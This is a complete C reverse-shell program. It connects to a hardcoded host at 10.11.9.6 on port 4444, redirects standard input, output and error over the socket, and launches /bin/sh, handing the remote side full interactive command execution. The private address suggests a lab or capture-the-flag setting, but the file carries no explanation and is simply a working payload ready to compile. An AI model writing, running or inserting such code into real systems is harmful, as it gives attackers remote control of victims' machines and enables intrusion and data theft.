#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char *server_ip = "10.11.9.6";
    int server_port = 4444;  

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Failed to create socket");
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("Connection failed");
        close(sock);
        exit(1);
    }

    dup2(sock, 0);  
    dup2(sock, 1);  
    dup2(sock, 2);  

    char *const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    close(sock);

    return 0;
}